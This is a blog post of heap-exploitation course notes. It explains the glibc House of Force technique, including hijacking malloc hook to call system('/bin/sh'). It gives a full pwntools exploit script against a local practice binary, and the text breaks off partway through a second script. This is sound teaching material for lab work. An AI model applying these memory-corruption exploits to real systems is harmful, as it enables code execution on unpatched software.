<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="For nearly 20 years, exploiting memory allocators has been something of an art form. Become part of that legacy with HeapLAB. The GNU C Library (GLIBC) is a fundamental part of most Linux desktop and many embedded distributions; its memory allocator is used in everything from starting threads to dealing with I/O. Learn how to leverage this vast attack surface via different heap exploitation techniques, from the original \" unsafe unlink\" to the beautiful overflow-to-shell \"house of orange\". in this hands-on course, students will alternate between learning new techniques and developing their own exploits based on what they've learned. we'll make use of the pwntools and pwndbg frameworks to drop shells from vulnerable practice binaries, and you'll take on challenges that test what you've learned."><title>Linux Heap Exploitation - Part 1</title>
<link rel=canonical href=https://demo.stack.jimmycai.com/p/welcome-to-linux-heap-exploitation-~-part-1/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="Linux Heap Exploitation - Part 1"><meta property='og:description' content="For nearly 20 years, exploiting memory allocators has been something of an art form. Become part of that legacy with HeapLAB. The GNU C Library (GLIBC) is a fundamental part of most Linux desktop and many embedded distributions; its memory allocator is used in everything from starting threads to dealing with I/O. Learn how to leverage this vast attack surface via different heap exploitation techniques, from the original \" unsafe unlink\" to the beautiful overflow-to-shell \"house of orange\". in this hands-on course, students will alternate between learning new techniques and developing their own exploits based on what they've learned. we'll make use of the pwntools and pwndbg frameworks to drop shells from vulnerable practice binaries, and you'll take on challenges that test what you've learned."><meta property='og:url' content='https://demo.stack.jimmycai.com/p/welcome-to-linux-heap-exploitation-~-part-1/'><meta property='og:site_name' content="Blog's Broder"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='pwnable'><meta property='article:published_time' content='2024-06-15T00:00:00+00:00'><meta property='article:modified_time' content='2024-06-15T00:00:00+00:00'><meta property='og:image' content='https://demo.stack.jimmycai.com/p/welcome-to-linux-heap-exploitation-~-part-1/cover.jpg'><meta name=twitter:title content="Linux Heap Exploitation - Part 1"><meta name=twitter:description content="For nearly 20 years, exploiting memory allocators has been something of an art form. Become part of that legacy with HeapLAB. The GNU C Library (GLIBC) is a fundamental part of most Linux desktop and many embedded distributions; its memory allocator is used in everything from starting threads to dealing with I/O. Learn how to leverage this vast attack surface via different heap exploitation techniques, from the original \" unsafe unlink\" to the beautiful overflow-to-shell \"house of orange\". in this hands-on course, students will alternate between learning new techniques and developing their own exploits based on what they've learned. we'll make use of the pwntools and pwndbg frameworks to drop shells from vulnerable practice binaries, and you'll take on challenges that test what you've learned."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://demo.stack.jimmycai.com/p/welcome-to-linux-heap-exploitation-~-part-1/cover.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu52d511cf9903ea4ad70f535dcc239819_494186_300x0_resize_box_3.png width=300 height=298 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>❟❛❟</span></figure><div class=site-meta><h1 class=site-name><a href=/>Blog's Broder</a></h1><h2 class=site-description>“Sometimes You Must Hurt In Order To Know, Fall In Order To Grow, Lose In Order To Gain, Because Life’s Greatest Lessons Are Learned Through Pain.” - Pain</h2></div></header><ol class=menu-social><li><a href=https://github.com/BabyBroder target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/broder5631 target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/about-me/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>About me</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#house-of-force>House of force</a><ol><li><a href=#overall>Overall</a></li><li><a href=#approach>Approach</a></li><li><a href=#further-use>Further use</a></li><li><a href=#limitations>Limitations</a></li><li><a href=#script>Script</a></li></ol></li><li><a href=#fastbin-dup>Fastbin dup</a><ol><li><a href=#overall-1>Overall</a></li><li><a href=#approach-1>Approach</a></li><li><a href=#further-use-1>Further use</a></li><li><a href=#limitations-1>Limitations</a></li><li><a href=#fastbin-dup-1>Fastbin dup 1</a></li><li><a href=#fastbin-dup-2>Fastbin dup 2</a></li></ol></li><li><a href=#unsafe-unlink>Unsafe unlink</a><ol><li><a href=#overall-2>Overall</a></li><li><a href=#approach-2>Approach</a></li><li><a href=#further-use-2>Further use</a></li><li><a href=#limitations-2>Limitations</a></li><li><a href=#script-1>Script</a></li></ol></li><li><a href=#safe-unlink>Safe unlink</a><ol><li><a href=#overall-3>Overall</a></li><li><a href=#approach-3>Approach</a></li><li><a href=#further-use-3>Further use</a></li><li><a href=#limitations-3>Limitations</a></li><li><a href=#script-2>Script</a></li></ol></li><li><a href=#house-of-orange>House of Orange</a><ol><li><a href=#overall-4>Overall</a><ol><li><a href=#bug>Bug</a></li></ol></li><li><a href=#approach-4>Approach</a><ol><li><a href=#create-free-chunk>Create free chunk</a></li><li><a href=#find-the-target>Find the target</a></li><li><a href=#set-up>Set up</a></li></ol></li><li><a href=#complete-script>Complete script</a></li></ol></li><li><a href=#one-byte>One byte</a><ol><li><a href=#overall-5>Overall</a><ol><li><a href=#malloc>malloc</a></li><li><a href=#free>free</a></li><li><a href=#edit>edit</a></li><li><a href=#read>read</a></li><li><a href=#quit>quit</a></li></ol></li><li><a href=#bug-1>Bug</a><ol><li></li></ol></li><li><a href=#template>Template</a></li><li><a href=#approach-5>Approach</a><ol><li></li><li><a href=#leak-libc>Leak libc</a></li><li><a href=#leak-heap>Leak heap</a></li><li><a href=#the-house-of-orange>The house of orange</a></li><li><a href=#complete-script-1>Complete script</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/welcome-to-linux-heap-exploitation-~-part-1/><img src=/p/welcome-to-linux-heap-exploitation-~-part-1/cover_hu1baf41c855c051bc94a2dd717dae5de0_73444_800x0_resize_q75_box.jpg srcset="/p/welcome-to-linux-heap-exploitation-~-part-1/cover_hu1baf41c855c051bc94a2dd717dae5de0_73444_800x0_resize_q75_box.jpg 800w, /p/welcome-to-linux-heap-exploitation-~-part-1/cover_hu1baf41c855c051bc94a2dd717dae5de0_73444_1600x0_resize_q75_box.jpg 1600w" width=800 height=450 loading=lazy alt="Featured image of post Linux Heap Exploitation - Part 1"></a></div><div class=article-details><header class=article-category><a href=/categories/heap/>Heap
</a><a href=/categories/exploit/>Exploit
</a><a href=/categories/ctf/>CTF
</a><a href=/categories/linux-heap-exploitation---part-1/>Linux Heap Exploitation - Part 1</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/welcome-to-linux-heap-exploitation-~-part-1/>Linux Heap Exploitation - Part 1</a></h2><h3 class=article-subtitle>For nearly 20 years, exploiting memory allocators has been something of an art form. Become part of that legacy with HeapLAB. The GNU C Library (GLIBC) is a fundamental part of most Linux desktop and many embedded distributions; its memory allocator is used in everything from starting threads to dealing with I/O. Learn how to leverage this vast attack surface via different heap exploitation techniques, from the original "Unsafe Unlink" to the beautiful overflow-to-shell "House of Orange". In this hands-on course, students will alternate between learning new techniques and developing their own exploits based on what they've learned. We'll make use of the pwntools and pwndbg frameworks to drop shells from vulnerable practice binaries, and you'll take on challenges that test what you've learned.</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jun 15, 2024</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>33 minute read</time></div></footer></div></header><section class=article-content><h2 id=house-of-force>House of force</h2><h3 id=overall>Overall</h3><p><img src=https://hackmd.io/_uploads/BJ5ez5Ur0.png loading=lazy alt=image></p><p><strong>When a program allocates memory from the heap, the operating system allocates a block of physical memory (or a combination of physical and disk memory) and assigns a virtual address to it. This virtual address becomes part of the process&rsquo;s virtual address space and can be used by the program to access the allocated memory.</strong></p><ul><li><em><strong>Virtual Memory (VA)</strong></em><ul><li>It&rsquo;s a memory management technique employed by operating systems to provide processes with the illusion of having more contiguous physical memory (RAM) than is actually available.</li><li>The operating system maintains a translation table that maps virtual addresses used by a process to physical addresses in RAM or on secondary storage (like a hard disk).</li><li>This allows processes to use more memory than physically present by swapping data between RAM and disk as needed.</li></ul></li><li><em><strong>Heap</strong></em><ul><li>The heap is a region of memory within a process&rsquo;s virtual address space.</li><li>It&rsquo;s managed dynamically during program execution. Programs can allocate and deallocate memory from the heap using functions like malloc (allocate) and free (deallocate) in C/C++.</li><li>The heap is typically used to store dynamically allocated objects or data structures whose size is not known at compile time.</li></ul></li><li>The heap itself is not a separate address space. It exists within the process&rsquo;s virtual address space managed by the operating system&rsquo;s virtual memory mechanism.</li></ul><p><em><strong>In GLIBC versions &lt; 2.29</strong></em>, top chunk size fields are not subject to any integrity checks during allocations. If a top chunk size field is overwritten using e.g. an overflow and replaced with a large value, subsequent allocations from that top chunk can overlap in-use memory. Very large allocations from a <em><strong>corrupted top chunk can wrap around the VA space in GLIBC versions &lt; 2.30</strong></em>.</p><ul><li>For example, a top chunk starts at address 0x405000 and target data residing at address 0x404000 in the program’s data section must be overwritten. Overwrite the top chunk size field using a bug, replacing it with the value 0xfffffffffffffff1. Next, calculate the number of bytes needed to move the top chunk to an address just before the target. The total is 0xffffffffffffffff - 0x405000 bytes to reach the end of the VA space, then 0x404000 - 0x20 more bytes to stop just short of the target address.</li></ul><h3 id=approach>Approach</h3><ul><li><p><em><strong>Overwrite a top chunk size field</strong></em> with a <em>large value</em>, <em><strong>then request enough memory</strong></em> to bridge the gap between the top chunk and target data. <em><strong>Allocations</strong></em> made in this way can wrap around the VA space, allowing this technique to target memory at a lower address than the heap.</p></li><li><p>Each of malloc&rsquo;s core functions, such as malloc() and free(), has an associated hook which takes the form of a writable function pointer in GLIBC&rsquo;s data section. Under normal circumstances these hooks can be used by developers to do things like implement theirown memory allocators or to collect malloc statistics.</p></li></ul><h3 id=further-use>Further use</h3><ul><li><p><em><strong>If the target resides on the same heap as the corrupt top chunk</strong></em>, leaking a heap address is not required, the allocation can wrap around the VA space back onto the same heap to an address relative to the top chunk.</p></li><li><p>The malloc hook is a viable target for this technique because passing arbitrarily large requests to malloc() is a prerequisite of the House of Force. Overwriting the malloc hook with the address of system(), then passing the address of a “/bin/sh” string to malloc masquerading as the request size becomes the equivalent of system(“/bin/sh”).</p></li></ul><h3 id=limitations>Limitations</h3><ul><li><em><strong>GLIBC version 2.29</strong></em> introduced a top chunk size field sanity check, which ensures that the top chunk size does not exceed its arena’s system_mem value.</li><li><em><strong>GLIBC version 2.30</strong></em> introduced a maximum allocation size check, which limits the size of the gap the House of Force can bridge.</li></ul><h3 id=script>Script</h3><p><em><strong>overwritetarget.py</strong></em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_force&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+295
</span></span></span><span class=line><span class=cl><span class=s2>b *main+448
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>}</span> <span class=p>,</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delta</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=mh>0xffffffffffffffff</span> <span class=o>-</span> <span class=n>x</span><span class=p>)</span> <span class=o>+</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvn</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;heap @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvn</span><span class=p>(</span><span class=mi>8</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;The address of puts:: &#34;</span><span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;The address of heap: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap_leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>distance</span> <span class=o>=</span> <span class=n>delta</span><span class=p>(</span><span class=n>heap_leak</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;target&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>24</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xffffffffffffffff</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>distance</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;oke&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;You win&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span> 
</span></span></code></pre></td></tr></table></div></div><p><em><strong>shell.py</strong></em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_force&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+295
</span></span></span><span class=line><span class=cl><span class=s2>b *main+448
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
